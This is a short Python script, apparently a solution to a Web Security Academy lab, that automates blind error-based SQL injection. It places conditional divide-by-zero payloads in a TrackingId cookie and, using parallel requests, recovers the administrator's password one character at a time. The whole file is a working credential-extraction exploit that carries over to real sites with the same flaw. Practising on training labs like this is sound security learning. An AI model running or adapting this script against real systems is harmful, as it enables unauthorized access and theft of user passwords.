#!/usr/bin/env python3

import pwn
import requests
import signal
import string
import sys

from concurrent.futures import ThreadPoolExecutor

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(0)

signal.signal(signal.SIGINT,def_handler)

URL = "https://0a31000a04c4495280ac088200dd0018.web-security-academy.net"
result = ""
p1 = pwn.log.progress("Iniciando ataque SQLI")
p2 = pwn.log.progress("Resultado")
characters = string.ascii_lowercase + string.digits

def makeSQLI(pos,i):
    global result
    global p1
    global p2
    global error


    injection = "'||(select case when (substr(password,%d,1)='%s') then to_char(1/0) else '' end from users where username='administrator')-- -" %(pos,i)
    p1.status(injection)

    cookies = {
        'TrackingId':'hKT0rDxYwogf8igp' + injection,
        'session':'ZrYFAkLrsCnghgXorVnF5xNqveQyw2AQ'
    }

    r = requests.get(url=URL,cookies=cookies)
    if r.status_code == 500:
        result += i
        p2.status(result)
        return True
        

for pos in range(1,21):
    with ThreadPoolExecutor(max_workers=36) as executor:
        executor.map(lambda i: makeSQLI(pos,i),characters)
